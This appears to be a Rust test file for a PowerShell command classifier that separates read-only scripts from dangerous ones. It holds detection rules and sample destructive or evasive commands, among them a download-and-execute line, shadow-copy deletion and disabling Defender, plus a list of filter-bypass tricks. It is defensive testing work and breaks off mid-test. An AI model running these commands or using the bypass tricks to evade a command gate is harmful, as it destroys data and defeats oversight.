//! BX-13: the PowerShell parser and rules, one test (or more) per rule. Hosts and users in samples are reserved
//! examples only.

use base64::Engine;
use regex::Regex;

use super::parse::{command_key, parse};
use super::*;

fn read_only(script: &str) -> bool {
    is_read_only(script, &default_read_only_commands())
}

/// The names of the default dangerous rules a script matches: as typed, or in one of its commands as read.
fn dangerous(script: &str) -> Vec<String> {
    let lines: Vec<String> = commands(script).iter().map(PsCommand::line).collect();
    default_dangerous_patterns()
        .into_iter()
        .filter(|p| {
            let re = Regex::new(&p.pattern).unwrap();
            re.is_match(script) || lines.iter().any(|l| re.is_match(l))
        })
        .map(|p| p.name)
        .collect()
}

fn flagged(script: &str, rule: &str) -> bool {
    dangerous(script).iter().any(|r| r == rule)
}

fn names(script: &str) -> Vec<String> {
    parse(script).commands.into_iter().map(|c| c.name).collect()
}

fn unreadable(script: &str) -> Vec<String> {
    parse(script).unreadable
}

// ---- The parser ---------------------------------------------------------------------------------------------------

#[test]
fn pipelines_statements_and_chains_are_split() {
    assert_eq!(
        names("Get-Process | Sort-Object CPU; Get-Service\nGet-Date && hostname || whoami"),
        [
            "Get-Process",
            "Sort-Object",
            "Get-Service",
            "Get-Date",
            "hostname",
            "whoami"
        ]
    );
    assert!(unreadable("Get-Process | Sort-Object CPU; Get-Service").is_empty());
}

#[test]
fn aliases_are_their_commands_and_programs_lose_their_extension() {
    assert_eq!(
        names("gci | ? { $_.Length -gt 1 } | % { $_.Name }; rm x; del y; iex 'a'; gwmi Win32_BIOS"),
        [
            "Get-ChildItem",
            "Where-Object",
            "ForEach-Object",
            "Remove-Item",
            "Remove-Item",
            "Invoke-Expression",
            "a",
            "Get-WmiObject"
        ]
    );
    assert_eq!(
        command_key("IPCONFIG.EXE"),
        ("IPCONFIG".to_owned(), Some("ipconfig.exe".to_owned()))
    );
    assert_eq!(
        command_key("ipconfig"),
        ("ipconfig".to_owned(), Some("ipconfig.exe".to_owned()))
    );
    assert_eq!(
        command_key("sc"),
        ("Set-Content".to_owned(), Some("set-content".to_owned()))
    );
    assert_eq!(command_key("sc.exe"), ("sc".to_owned(), Some("sc.exe".to_owned())));
    assert_eq!(
        command_key("Get-Service"),
        ("Get-Service".to_owned(), Some("get-service".to_owned()))
    );
    // A path runs whatever is there: no key, and its last part for the dangerous rules.
    assert_eq!(command_key(r"C:\Tools\ipconfig.exe"), ("ipconfig".to_owned(), None));
    assert_eq!(command_key(r".\cleanup.ps1"), ("cleanup.ps1".to_owned(), None));
    assert_eq!(
        command_key(r"Microsoft.PowerShell.Management\Remove-Item").0,
        "Remove-Item"
    );
    // PowerShell reads the en dash as a dash.
    assert_eq!(command_key("Get\u{2013}Service").1.as_deref(), Some("get-service"));
}

#[test]
fn commands_inside_blocks_parentheses_and_strings_are_found() {
    let found = names(
        "Write-Output \"$(Stop-Computer)\"; $x = (Get-Item a); Get-Process -Name (Get-Content b) \
         | Select-Object @{ n = 'c'; e = { Restart-Computer } }; @(Remove-Item d)",
    );
    for name in [
        "Stop-Computer",
        "Get-Item",
        "Get-Content",
        "Restart-Computer",
        "Remove-Item",
    ] {
        assert!(found.iter().any(|n| n == name), "{name} in {found:?}");
    }
    // Here-strings: the literal one runs nothing, the expandable one's subexpression runs.
    let here = "$a = @'\nStop-Computer\n'@\n$b = @\"\n$(Restart-Computer)\n\"@";
    assert_eq!(names(here), ["Restart-Computer"]);
    assert!(unreadable(here).is_empty(), "{:?}", unreadable(here));
}

#[test]
fn control_flow_bodies_are_read() {
    let script = "if ($true) { Get-Date } elseif ($false) { hostname } else { Stop-Service a }\n\
                  foreach ($s in Get-Service) { $s.Name }\n\
                  for ($i = 0; $i -lt 3; $i++) { Get-Process }\n\
                  while ($false) { Remove-Item x }\n\
                  do { whoami } until ($true)\n\
                  try { Get-Item q } catch [System.Exception] { Write-Warning 'x' } finally { Get-Date }\n\
                  switch -regex ('a') { 'a' { Restart-Service b } default { 'none' } }";
    let found = names(script);
    for name in [
        "Get-Date",
        "hostname",
        "Stop-Service",
        "Get-Service",
        "Get-Process",
        "Remove-Item",
        "whoami",
        "Get-Item",
        "Write-Warning",
        "Restart-Service",
    ] {
        assert!(found.iter().any(|n| n == name), "{name} in {found:?}");
    }
    assert!(unreadable(script).is_empty(), "{:?}", unreadable(script));
}

#[test]
fn the_call_operator_and_dot_sourcing() {
    // A literal name or block is read like any command.
    assert_eq!(
        names("& 'Remove-Item' -Recurse x; & { Stop-Computer }"),
        ["Remove-Item", "Stop-Computer"]
    );
    assert!(unreadable("& { Get-Date }").is_empty());
    assert!(read_only("& { Get-Date }; . { hostname }"));
    // Anything else can't be.
    for script in [
        "& $cmd",
        "& (Get-Command x)",
        ". $profile",
        ". .\\setup.ps1",
        "& \"$tool\" /x",
    ] {
        assert!(!unreadable(script).is_empty(), "{script}");
        assert!(!read_only(script), "{script}");
    }
}

#[test]
fn what_it_cant_read_fails_closed() {
    for script in [
        // Method calls, except the few that only compute a value.
        "Get-Process notepad | ForEach-Object { $_.Kill() }",
        "(Get-Item C:\\x).Delete()",
        "[System.IO.File]::WriteAllText('C:\\x', 'y')",
        "[scriptblock]::Create('Stop-Computer').Invoke()",
        "$x.$name()",
        "(Get-Process).ForEach('Kill')",
        // Redirections that write a file, and input redirection.
        "Get-Date > C:\\out.txt",
        "Get-Date 2>> errors.log",
        "Get-Date *> all.txt",
        "Get-Content < input.txt",
        // Assignments to anything but a plain variable of the script's own.
        "$env:Path = 'C:\\x'",
        "$global:x = 1",
        "${C:\\x.txt} = 'y'",
        "$o.Name = 'y'",
        "$a[0] = 1",
        "$o.Count++",
        // Splatting, the stop-parsing token, a function definition.
        "Get-ChildItem @params",
        "ipconfig --% /release",
        "function Get-Service { Stop-Service spooler }",
        // Left open.
        "Get-Item 'x",
        "Get-Process | ",
        "if ($a) { Get-Date",
        "Get-Date )",
        "<# a comment",
        // The language's rarer parts.
        "class Thing { }",
        "using namespace System.IO",
        "param([ValidateScript({ Remove-Item x })] $p)",
    ] {
        assert!(!unreadable(script).is_empty(), "{script} should not read");
        assert!(!read_only(script), "{script} should not be read-only");
    }
}

#[test]
fn pure_methods_casts_and_plain_variables_are_read() {
    for script in [
        "$d = Get-Date; $d.AddDays(-1).ToString('yyyy-MM-dd')",
        "[math]::Round((Get-Date).Second / 7, 2)",
        "(Get-Process).Where({ $_.CPU -gt 10 }, 'First')",
        "$n = 0; $n++; $n += 2; [int]'5' + $n",
        "'{0} {1}' -f 'a', (hostname)",
        "$PSVersionTable.PSVersion",
        "Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name",
        "Get-WinEvent -FilterHashtable @{ LogName = 'System'; Level = 1, 2 } -MaxEvents 5 2>$null",
        "Get-Date 2>&1",
        "1..3 | ForEach-Object { $_ * 2 }",
        "Get-ChildItem C:\\Logs -Recurse -Filter *.log | Measure-Object -Property Length -Sum",
    ] {
        assert!(unreadable(script).is_empty(), "{script}: {:?}", unreadable(script));
        assert!(read_only(script), "{script} should be read-only");
    }
}

#[test]
fn nested_interpreters_are_followed() {
    assert!(names("powershell -NoProfile -Command \"Stop-Computer -Force\"").contains(&"Stop-Computer".to_owned()));
    assert!(names("pwsh -c 'Remove-Item -Recurse C:\\x'").contains(&"Remove-Item".to_owned()));
    assert!(names("powershell.exe 'Restart-Computer'").contains(&"Restart-Computer".to_owned()));
    assert!(names("cmd /c \"del /s /q C:\\x & shutdown /r\"").contains(&"shutdown".to_owned()));
    assert!(names("cmd.exe /c powershell -c Stop-Computer").contains(&"Stop-Computer".to_owned()));
    assert!(names("Invoke-Expression 'Stop-Computer'").contains(&"Stop-Computer".to_owned()));
    assert!(names("Start-Process powershell -ArgumentList '-c Stop-Computer'").contains(&"Stop-Computer".to_owned()));
    // -EncodedCommand is decoded (base64 of UTF-16LE).
    let utf16: Vec<u8> = "Restart-Computer -Force"
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect();
    let encoded = base64::engine::general_purpose::STANDARD.encode(utf16);
    assert!(names(&format!("powershell -enc {encoded}")).contains(&"Restart-Computer".to_owned()));
    // An interpreter never reads only, whatever it runs.
    assert!(!read_only("powershell -c Get-Date"));
    assert!(!read_only("cmd /c dir"));
    // Nested three deep at most.
    let deep = "pwsh -c 'pwsh -c \"pwsh -c Stop-Computer\"'";
    assert!(names(deep).contains(&"Stop-Computer".to_owned()));
}

// ---- Read-only list and its exceptions ----------------------------------------------------------------------------

#[test]
fn the_default_list_reads_and_others_dont() {
    for script in [
        "Get-ComputerInfo",
        "gsv | sort Status",
        "Get-NetTCPConnection -State Listen",
        "ipconfig /all",
        "IPCONFIG",
        "netstat -ano",
        "whoami /groups",
        "route print",
        "sc.exe query WinRM",
        "Resolve-DnsName example.com",
        "Test-NetConnection 192.0.2.10 -Port 5986",
        "nslookup example.org",
        "Get-HotFix | Format-Table -AutoSize | Out-String -Width 4096",
    ] {
        assert!(read_only(script), "{script} should be read-only");
    }
    for script in [
        "Stop-Service Spooler",
        "Set-Content x y",
        "sc query WinRM",
        "New-Item C:\\x -ItemType File",
        "Restart-Service WinRM",
        "Invoke-WebRequest https://example.com",
        "Read-Host 'Name'",
        "Get-Service | Stop-Service",
        "C:\\Windows\\System32\\ipconfig.exe /all",
        "Get-Service; Clear-RecycleBin",
    ] {
        assert!(!read_only(script), "{script} should not be read-only");
    }
}

#[test]
fn forms_that_write_are_never_read_only() {
    for script in [
        "ipconfig /release",
        "ipconfig -renew",
        "ipconfig /FlushDNS",
        "ipconfig $x",
        "arp -a -d 192.0.2.1",
        "route print; route add 0.0.0.0 mask 0.0.0.0 192.0.2.1",
        "netsh interface show interface; netsh interface set interface Ethernet disable",
        "netsh advfirewall show allprofiles state; netsh advfirewall reset",
        "nslookup",
        "nslookup -type=mx",
        "gpresult /h C:\\report.html",
        "sc.exe query WinRM; sc.exe stop WinRM",
        "schtasks /query; schtasks /run /tn x",
        "reg query HKLM\\Software; reg add HKLM\\Software\\x",
        "wevtutil qe System; wevtutil cl System",
        "w32tm /query /status; w32tm /resync",
        "bcdedit /enum; bcdedit /set x",
        "vssadmin list shadows; vssadmin delete shadows /all",
        "Get-Process notepad | % Kill",
        "Get-Process notepad | ForEach-Object -MemberName Kill",
        "Get-Process | ForEach-Object -m Kill",
        "Get-Process | ForEach-Object -Process $sb",
        "Get-Process | ForEach-Object -Process:$sb",
    ] {
        let cmds = commands(script);
        assert!(!read_only(script), "{script} should not be read-only ({cmds:?})");
    }
    // The forms that only read stay read-only.
    for script in [
        "Get-Process | ForEach-Object -Begin { $n = 0 } -Process { $n++ } -End { $n }",
        "Get-Process | ForEach-Object -Process:{ $_.Name }",
        "arp -a",
        "w32tm /tz",
        "bcdedit /enum /v",
    ] {
        assert!(read_only(script), "{script} should be read-only");
    }
}

#[test]
fn runners_and_aliases_cant_be_entries() {
    for entry in [
        "powershell",
        "pwsh",
        "cmd",
        "cmd.exe",
        "Invoke-Expression",
        "Invoke-Command",
        "Start-Process",
        "Start-Job",
        "Set-Alias",
        "New-Alias",
        "Add-Type",
        "Import-Module",
        "wscript",
        "mshta",
        "rundll32",
        "python3.12",
        "wsl",
        "deploy.ps1",
        "setup.bat",
    ] {
        let why = entry_problem(entry).unwrap_or_default();
        assert!(why.contains("can't be read-only"), "{entry}: {why}");
    }
    for entry in ["iex", "dir", "gci", "sc", "%", "rm"] {
        let why = entry_problem(entry).unwrap_or_default();
        assert!(why.contains("alias"), "{entry}: {why}");
    }
    for entry in [
        "Get-Service; Stop-Service x",
        "Get-Item $x",
        "Get-Item (x)",
        "a | b",
        "Get-Item 'x'",
        "Get-Item @p",
    ] {
        let why = entry_problem(entry).unwrap_or_default();
        assert!(why.contains("operator"), "{entry}: {why}");
    }
    assert!(entry_problem(r"C:\Tools\x.exe").unwrap_or_default().contains("path"));
    assert!(entry_problem("  ").unwrap_or_default().contains("empty"));
    // The defaults are all valid entries, each once.
    let defaults = default_read_only_commands();
    for entry in &defaults {
        assert_eq!(entry_problem(entry), None, "{entry}");
    }
    let mut seen = std::collections::HashSet::new();
    assert!(defaults.iter().all(|e| seen.insert(e.to_lowercase())));
}

#[test]
fn a_user_entry_with_a_program_reads_only_its_listed_form() {
    let mut list = default_read_only_commands();
    list.push("dism /online /get-features".into());
    assert!(is_read_only("dism /online /get-features", &list));
    assert!(!is_read_only("dism /online /enable-feature", &list));
    // An entry's words match literal words only.
    assert!(!is_read_only("dism $mode /get-features", &list));
}

// ---- The dangerous rules, one test each ---------------------------------------------------------------------------

#[test]
fn every_default_dangerous_rule_compiles_and_never_matches_empty_text() {
    for p in default_dangerous_patterns() {
        let re = Regex::new(&p.pattern).unwrap_or_else(|e| panic!("{}: {e}", p.name));
        assert!(!re.is_match(""), "{}", p.name);
    }
}

#[test]
fn rule_stop_or_restart_computer() {
    let rule = "Stop-Computer / Restart-Computer";
    assert!(flagged("Stop-Computer -Force", rule));
    assert!(flagged("Restart-Computer -ComputerName win01.example.com", rule));
    assert!(flagged("if ($x) { Restart-Computer }", rule));
    assert!(!flagged("Get-Help Restart-Computer-Thing", rule));
    assert!(!flagged("Write-Output 'Stop-Computer later'", rule));
}

#[test]
fn rule_shutdown_or_logoff() {
    let rule = "shutdown / logoff";
    assert!(flagged("shutdown /r /t 0", rule));
    assert!(flagged("shutdown.exe -s", rule));
    assert!(flagged("cmd /c \"shutdown /p\"", rule));
    assert!(flagged("logoff 2", rule));
    assert!(!flagged("shutdown /a", rule));
    assert!(!flagged("Get-Help shutdown", rule));
}

#[test]
fn rule_remove_item_recurse() {
    let rule = "Remove-Item -Recurse / rd /s";
    assert!(flagged("Remove-Item C:\\Data -Recurse -Force", rule));
    assert!(flagged("rm -r C:\\Data", rule));
    assert!(
        flagged("ri C:\\Data \u{2013}Recurse", rule),
        "an en dash reads as a dash"
    );
    assert!(flagged("Get-ChildItem x | Remove-Item -rec", rule));
    assert!(flagged("cmd /c \"rd /s /q C:\\Data\"", rule));
    assert!(!flagged("Remove-Item C:\\Temp\\x.txt", rule));
    assert!(!flagged("Get-ChildItem -Recurse", rule));
}

#[test]
fn rule_format_volume_or_clear_disk() {
    let rule = "Format-Volume / Clear-Disk / diskpart";
    assert!(flagged("Format-Volume -DriveLetter D", rule));
    assert!(flagged("Get-Disk 1 | Clear-Disk -RemoveData", rule));
    assert!(flagged("Initialize-Disk 2", rule));
    assert!(flagged("format D: /q", rule));
    assert!(flagged("diskpart /s script.txt", rule));
    assert!(!flagged("Get-Volume", rule));
    assert!(!flagged("Format-Table", rule));
}

#[test]
fn rule_invoke_expression() {
    let rule = "Invoke-Expression";
    assert!(flagged("Invoke-Expression $text", rule));
    assert!(flagged(
        "iex (New-Object Net.WebClient).DownloadString('https://example.com/x')",
        rule
    ));
    assert!(flagged("IEX('Get-Date')", rule));
    assert!(!flagged("Get-Help about_Invoke", rule));
}

#[test]
fn rule_encoded_command() {
    let rule = "powershell -EncodedCommand";
    assert!(flagged("powershell -EncodedCommand ZQBjAGgAbwA=", rule));
    assert!(flagged("pwsh.exe -NoProfile -enc ZQBjAGgAbwA=", rule));
    assert!(flagged("powershell -e ZQBjAGgAbwA=", rule));
    assert!(flagged("powershell /ec ZQBjAGgAbwA=", rule));
    assert!(!flagged("powershell -ExecutionPolicy Bypass -File x.ps1", rule));
    assert!(!flagged("powershell -c Get-Date", rule));
}

#[test]
fn rule_stop_or_disable_winrm() {
    let rule = "stop or disable WinRM";
    assert!(flagged("Stop-Service WinRM", rule));
    assert!(flagged("Restart-Service -Name winrm -Force", rule));
    assert!(flagged("Set-Service WinRM -StartupType Disabled", rule));
    assert!(flagged("Disable-PSRemoting -Force", rule));
    assert!(flagged("net stop winrm", rule));
    assert!(flagged("sc.exe config winrm start= disabled", rule));
    assert!(!flagged("Get-Service WinRM", rule));
    assert!(!flagged("Set-Service WinRM -StartupType Automatic", rule));
}

#[test]
fn rule_disable_a_network_adapter() {
    let rule = "disable a network adapter or address";
    assert!(flagged("Disable-NetAdapter -Name Ethernet -Confirm:$false", rule));
    assert!(flagged("Remove-NetIPAddress -IPAddress 192.0.2.10", rule));
    assert!(flagged("Remove-NetRoute -DestinationPrefix 0.0.0.0/0", rule));
    assert!(flagged("netsh interface set interface Ethernet disabled", rule));
    assert!(!flagged("Get-NetAdapter", rule));
}

#[test]
fn rule_firewall() {
    let rule = "remove firewall rules / block outbound";
    assert!(flagged(
        "Remove-NetFirewallRule -DisplayName 'Windows Remote Management (HTTP-In)'",
        rule
    ));
    assert!(flagged("Disable-NetFirewallRule -Group x", rule));
    assert!(flagged(
        "Set-NetFirewallProfile -All -DefaultOutboundAction Block",
        rule
    ));
    assert!(flagged(
        "netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound",
        rule
    ));
    assert!(flagged("netsh advfirewall reset", rule));
    assert!(!flagged("Get-NetFirewallRule", rule));
    assert!(!flagged(
        "Set-NetFirewallProfile -All -DefaultOutboundAction Allow",
        rule
    ));
}

#[test]
fn rule_stop_a_system_process() {
    let rule = "stop a system process";
    assert!(flagged("Stop-Process -Name lsass -Force", rule));
    assert!(flagged("taskkill /f /im csrss.exe", rule));
    assert!(flagged("kill -Name winlogon", rule), "kill is Stop-Process");
    assert!(!flagged("Stop-Process -Name notepad", rule));
    assert!(!flagged("Get-Process lsass", rule));
}

#[test]
fn rule_delete_users_or_directory_objects() {
    let rule = "delete users or directory objects";
    assert!(flagged("Remove-LocalUser -Name bob", rule));
    assert!(flagged("Get-ADUser alice | Remove-ADUser -Confirm:$false", rule));
    assert!(flagged("Remove-ADGroupMember -Identity admins -Members alice", rule));
    assert!(flagged("net user bob /delete", rule));
    assert!(!flagged("Get-LocalUser", rule));
    assert!(!flagged("net user bob", rule));
}

#[test]
fn rule_clear_event_logs() {
    let rule = "clear event logs";
    assert!(flagged("Clear-EventLog -LogName Security", rule));
    assert!(flagged("wevtutil cl System", rule));
    assert!(flagged("wevtutil.exe clear-log Application", rule));
    assert!(!flagged("Get-EventLog -LogName System -Newest 5", rule));
    assert!(!flagged("wevtutil qe System", rule));
}

#[test]
fn rule_delete_registry_keys() {
    let rule = "delete registry keys";
    assert!(flagged("reg delete HKLM\\Software\\Example /f", rule));
    assert!(flagged("Remove-Item HKLM:\\Software\\Example", rule));
    assert!(flagged("Remove-ItemProperty -Path HKCU:\\Software\\x -Name y", rule));
    assert!(flagged("Remove-Item Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\x", rule));
    assert!(!flagged("reg query HKLM\\Software", rule));
    assert!(!flagged("Remove-Item C:\\Temp\\x", rule));
}

#[test]
fn rule_turn_off_defender() {
    let rule = "turn off Windows Defender";
    assert!(flagged("Set-MpPreference -DisableRealtimeMonitoring $true", rule));
    assert!(flagged("Set-MpPreference -DisableIOAVProtection:1", rule));
    assert!(flagged("Add-MpPreference -ExclusionPath C:\\", rule));
    assert!(!flagged("Get-MpPreference", rule));
    assert!(!flagged("Set-MpPreference -DisableRealtimeMonitoring $false", rule));
}

#[test]
fn rule_bitlocker_or_boot_settings() {
    let rule = "BitLocker or boot settings";
    assert!(flagged("Disable-BitLocker -MountPoint C:", rule));
    assert!(flagged("Suspend-BitLocker -MountPoint C: -RebootCount 0", rule));
    assert!(flagged("bcdedit /set {default} recoveryenabled no", rule));
    assert!(flagged("bcdedit.exe /delete {x}", rule));
    assert!(flagged("manage-bde -off C:", rule));
    assert!(!flagged("bcdedit /enum", rule));
    assert!(!flagged("manage-bde -status", rule));
}

#[test]
fn rule_delete_shadow_copies() {
    let rule = "delete shadow copies or backups";
    assert!(flagged("vssadmin delete shadows /all /quiet", rule));
    assert!(flagged("vssadmin resize shadowstorage /for=C: /maxsize=1MB", rule));
    assert!(flagged("wbadmin delete catalog -quiet", rule));
    assert!(flagged("wmic shadowcopy delete", rule));
    assert!(flagged("Get-WmiObject Win32_ShadowCopy | Remove-WmiObject", rule));
    assert!(!flagged("vssadmin list shadows", rule));
}

#[test]
fn rule_uninstall_features_or_software() {
    let rule = "uninstall features or software";
    assert!(flagged("Uninstall-WindowsFeature Web-Server", rule));
    assert!(flagged("Disable-WindowsOptionalFeature -Online -FeatureName x", rule));
    assert!(flagged("Get-Package x | Uninstall-Package", rule));
    assert!(flagged("msiexec /x {00000000-0000-0000-0000-000000000000} /qn", rule));
    assert!(!flagged("Get-WindowsFeature", rule));
    assert!(!flagged("msiexec /i setup.msi", rule));
}

#[test]
fn rule_leave_the_domain() {
    let rule = "leave the domain";
    assert!(flagged("Remove-Computer -UnjoinDomainCredential $c -Restart", rule));
    assert!(flagged("Reset-ComputerMachinePassword", rule));
    assert!(flagged("netdom remove win01 /domain:example.com", rule));
    assert!(!flagged("Get-ComputerInfo", rule));
}

#[test]
fn rule_invoke_command_on_other_computers() {
    let rule = "Invoke-Command on other computers";
    assert!(flagged(
        "Invoke-Command -ComputerName win02.example.com -ScriptBlock { Get-Date }",
        rule
    ));
    assert!(flagged("icm -cn win02 { hostname }", rule), "icm is Invoke-Command");
    assert!(flagged("Invoke-Command -Session $s { hostname }", rule));
    assert!(flagged("Invoke-Command -comp win02 { hostname }", rule));
    assert!(!flagged("Invoke-Command -ScriptBlock { Get-Date }", rule));
}

#[test]
fn rule_sql_drops() {
    let rule = "DROP DATABASE / TABLE";
    assert!(flagged("Invoke-Sqlcmd -Query 'DROP DATABASE shop'", rule));
    assert!(flagged("sqlcmd -Q \"drop table orders\"", rule));
    assert!(flagged("Invoke-Sqlcmd -Query 'TRUNCATE TABLE logs'", rule));
    assert!(!flagged("Write-Output 'truncate the log'", rule));
    assert!(!flagged("Invoke-Sqlcmd -Query 'SELECT 1'", rule));
}

#[test]
fn rule_kubectl_delete() {
    let rule = "kubectl delete";
    assert!(flagged("kubectl delete pod web-0", rule));
    assert!(flagged("kubectl.exe -n shop delete deployment web", rule));
    assert!(!flagged("kubectl get pods", rule));
}

#[test]
fn rule_container_prunes_and_volume_removal() {
    assert!(flagged("docker system prune -af", "docker / podman prune"));
    assert!(flagged("docker.exe image prune", "docker / podman prune"));
    assert!(!flagged("docker ps -a", "docker / podman prune"));
    assert!(flagged("docker volume rm data", "docker / podman volume rm"));
    assert!(!flagged("docker volume ls", "docker / podman volume rm"));
}

#[test]
fn the_rules_see_nested_commands_and_aliases() {
    assert!(flagged(
        "powershell -c \"Stop-Computer\"",
        "Stop-Computer / Restart-Computer"
    ));
    assert!(flagged("cmd /c shutdown /r", "shutdown / logoff"));
    let utf16: Vec<u8> = "Remove-Item C:\\x -Recurse"
        .encode_utf16()
        .flat_map(u16::to_le_bytes)
        .collect();
    let encoded = base64::engine::general_purpose::STANDARD.encode(utf16);
    let hits = dangerous(&format!("powershell -EncodedCommand {encoded}"));
    assert!(hits.contains(&"Remove-Item -Recurse / rd /s".to_owned()), "{hits:?}");
    assert!(hits.contains(&"powershell -EncodedCommand".to_owned()), "{hits:?}");
}

#[test]
fn a_script_is_rated_as_the_statements_powershell_runs_it_as() {
    // PowerShell reads a script a line at a time: an empty line ends a statement left open, so this is three
    // statements, and the second runs. Read as one string, it would look like a read.
    let trick = "\"x\n\nRestart-Service Spooler\n\"";
    assert!(!read_only(trick));
    let trick = "@'\n\nStop-Computer\n'@";
    assert!(!read_only(trick));
    assert!(names(trick).is_empty(), "as one script it is a here-string");
    let lines: Vec<String> = commands(trick).iter().map(PsCommand::line).collect();
    assert!(lines.iter().any(|l| l.starts_with("Stop-Computer")), "{lines:?}");
    assert!(flagged(trick, "Stop-Computer / Restart-Computer"));
    // A statement over several lines that closes is one statement: still a read.
    assert!(read_only(
        "Get-Service |\n  Where-Object Status -eq 'Running' |\n  Select-Object Name"
    ));
    assert!(read_only("foreach ($s in Get-Service) {\n  $s.Name\n}"));
    assert!(read_only("Get-Date\r\nhostname\r\n"));
}

#[test]
fn deep_nesting_is_refused_not_overflowed() {
    let deep = format!("{}Get-Date{}", "(".repeat(500), ")".repeat(500));
    assert!(!read_only(&deep));
    let blocks = format!("{}Get-Date{}", "& {".repeat(200), "}".repeat(200));
    assert!(!read_only(&blocks));
}

// ---- Review PR #78: classifier bypasses, one test per finding (A1 to A10) -----------------------------------------

#[test]
fn a1_a_comment_glued_to_a_token_is_not_a_comment() {
    // PowerShell starts a comment only at a token boundary; `#` and `<#` glued to a token are part of it, so the text
    // after still runs and must be seen.
    for trick in [
        "Get-Date $x#; Stop-Service Spooler",
        "Get-Date ${x}#; Stop-Service Spooler",
        "Get-Date $env:x#; Stop-Service Spooler",
        "Get-Date 1#; Stop-Service Spooler",
        "whoami#; Stop-Service Spooler",
        "Get-Date -a#; Stop-Service Spooler",
        "whoami<# ; Stop-Service Spooler #>",
        "Get-Date $x#; & ([scriptblock]::Create('Stop-' + 'Service Spooler'))",
    ] {
        assert!(
            names(trick).iter().any(|n| n == "Stop-Service") || !unreadable(trick).is_empty(),
            "the hidden statement must be seen or the line unreadable: {trick}"
        );
        assert!(!read_only(trick), "{trick} should not be read-only");
    }
    // A comment after whitespace or a boundary still works (the common case).
    assert!(read_only("Get-Date # today's date"));
    assert!(read_only("(Get-Date)# a comment"));
    assert!(read_only("Get-Date <# inline #> -Format o"));
}

#[test]
fn a2_a_method_called_with_a_script_block_is_a_call() {
    // `.Name{ }` is a method call with one argument, like `.Name()`.
    for trick in [
        "(Get-Item C:\\data).Delete{}",
        "Get-Process x | ForEach-Object { $_.Delete{} }",
        "(Get-Service Spooler).Start{}",
    ] {
        assert!(!unreadable(trick).is_empty(), "{trick} should not read");
        assert!(!read_only(trick), "{trick} should not be read-only");
    }
    // `.Where{ }` and `.ForEach{ }` filtering stay read-only.
    assert!(read_only("(Get-Process).Where{ $_.CPU -gt 10 }"));
}

#[test]
fn a3_a_cast_to_a_non_value_type_runs_a_constructor() {
    for trick in [
        "[IO.StreamWriter]'C:\\data\\f.txt'",
        "'C:\\data\\f.txt' -as [IO.StreamWriter]",
        "[System.IO.StreamWriter]'C:\\x'",
        "$w = [Diagnostics.Process]'notepad'",
    ] {
        assert!(!unreadable(trick).is_empty(), "{trick} should not read");
        assert!(!read_only(trick), "{trick} should not be read-only");
    }
    // Plain value-type casts and `-as` still read.
    for ok in [
        "[int]'5' + 1",
        "[datetime]'2026-01-01'",
        "'5' -as [int]",
        "[ipaddress]'192.0.2.1'",
        "[int[]]@(1, 2, 3)",
    ] {
        assert!(unreadable(ok).is_empty(), "{ok}: {:?}", unreadable(ok));
        assert!(read_only(ok), "{ok} should be read-only");
    }
}

#[test]
fn a4_default_parameter_values_and_invoked_blocks_are_not_read_only() {
    for trick in [
        // Assigning an execution-steering automatic variable.
        "$PSDefaultParameterValues = @{ '*:MemberName' = 'Kill' }",
        "$PSDefaultParameterValues=@{'*:MemberName'='Kill'}; Get-Process x | ForEach-Object",
        "$ExecutionContext = $null",
        // A bare ForEach-Object with no literal block (it runs whatever the default value sets).
        "Get-Process x | ForEach-Object",
        // A script block given to an invoker as a variable or subexpression.
        "Get-Service | Where-Object $sb",
        "Measure-Command $sb",
        "Get-Service | Sort-Object $sb",
        "Get-Service | Select-Object @{ n = 'x'; e = $sb }",
    ] {
        assert!(
            !read_only(trick),
            "{trick} should not be read-only ({:?})",
            commands(trick)
        );
    }
    // `$null = <command>` and property-name lists stay read-only.
    assert!(read_only("$null = Get-Service"));
    assert!(read_only(
        "Get-Service | Sort-Object Status, Name | Select-Object Name, Status"
    ));
    assert!(read_only("Get-Service | Where-Object Status -eq 'Running'"));
}

#[test]
fn a5_deep_expressions_do_not_overflow_the_stack() {
    // Long prefix-operator and assignment chains recurse; the depth limit must stop them instead of crashing.
    let unary = format!("{}1", "-not ".repeat(20_000));
    assert!(!read_only(&unary));
    let assign = format!("{}1", "$a=".repeat(20_000));
    assert!(!read_only(&assign));
    let casts = format!("{}$x", "[int]".repeat(20_000));
    assert!(!read_only(&casts));
    let bang = format!("{}$x", "!".repeat(20_000));
    assert!(!read_only(&bang));
}

#[test]
fn a6_an_option_after_a_quote_is_its_own_argument() {
    // PowerShell ends an argument at a closing quote; the option glued after it is separate and must be seen.
    assert!(!read_only("gpresult /scope 'computer'/h 'out.html'/f"));
    assert!(flagged(
        "Remove-Item 'C:\\data'-Recurse",
        "Remove-Item -Recurse / rd /s"
    ));
}

#[test]
fn a7_run_together_switches_are_flagged() {
    assert!(flagged("cmd /c \"rd /s/q C:\\data\"", "Remove-Item -Recurse / rd /s"));
    assert!(flagged("shutdown /sg /t 0", "shutdown / logoff"));
    assert!(flagged("shutdown /r/t:0", "shutdown / logoff"));
}

#[test]
fn a9_digit_programs_interactive_tools_and_more_runners() {
    // A token that starts with a digit but is not a number is a command (a program that runs anything).
    assert_eq!(names("7z.exe Get-Date").first().map(String::as_str), Some("7z"));
    assert!(!read_only("7z.exe Get-Date"));
    assert!(!read_only("1z Get-Date"));
    // A real number literal is still an expression (read-only).
    assert!(read_only("1..3 | ForEach-Object { $_ }"));
    assert!(read_only("1kb + 1mb"));
    assert!(read_only("0x1F"));
    // nslookup with a lone `-` waits for typed lines.
    assert!(!read_only("nslookup - 192.0.2.1"));
    // More runners can't be read-only entries.
    for entry in [
        "dotnet.exe",
        "pcalua.exe",
        "ftp.exe",
        "diskshadow.exe",
        "odbcconf.exe",
        "Import-PSSession",
        "Trace-Command",
    ] {
        let why = entry_problem(entry).unwrap_or_default();
        assert!(why.contains("can't be read-only"), "{entry}: {why}");
    }
}

// ---- Re-review PR #78: the classifier fails closed on lexing ambiguity (P1 to P7) ---------------------------------

#[test]
fn p1_a_glued_comment_marker_makes_the_script_unreadable() {
    // A `#` or `<#` not at a clear boundary may or may not start a comment in PowerShell, so the script can't be read
    // as only reading. These all hid `Stop-Service Spooler` behind `#'…'` before; each is now not read-only.
    for trick in [
        "& {\nWrite-Output 'a'#'\nStop-Service Spooler\n#'\n}",
